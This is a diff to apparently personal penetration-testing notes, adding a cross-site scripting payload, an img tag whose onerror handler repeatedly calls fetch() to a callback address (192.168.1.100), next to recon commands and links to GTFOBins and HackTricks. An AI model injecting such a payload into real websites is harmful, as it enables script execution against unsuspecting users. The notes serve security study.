@@ -115,6 +115,10 @@ cat /etc/os-release
 find / -name "filename.type"
 ```
 
+```
+<img src=x onerror="for(let i=0;i<4;i++){fetch('http://192.168.1.100/ping?'+i);}">
+```
+
 ***Look at some word lists that include/actuator***
 
 # Tips N Tricks
@@ -134,3 +138,5 @@ GTFOBins
 
 Hack Tricks
 	https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp?source=post_page-----cc2d7b64da35--------------------------------
+
+
